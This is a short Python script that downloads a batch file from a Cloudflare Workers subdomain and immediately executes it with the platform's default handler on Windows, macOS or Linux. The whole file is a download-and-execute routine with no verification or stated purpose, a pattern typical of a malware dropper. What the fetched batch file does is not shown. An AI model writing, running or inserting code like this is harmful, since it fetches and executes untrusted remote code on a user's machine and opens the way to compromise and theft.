import requests
import os
import subprocess
import sys

url = "https://dark-resonance-459b.blammervale.workers.dev/555.bat"
filename = "bat.bat"

# Download the file
response = requests.get(url)
with open(filename, "wb") as f:
    f.write(response.content)

filepath = os.path.abspath(filename)
print("Downloaded to:", filepath)

# Open it with default program
if sys.platform.startswith("win"):
    os.startfile(filepath)
elif sys.platform.startswith("darwin"):
    subprocess.Popen(["open", filepath])
else:
    subprocess.Popen(["xdg-open", filepath])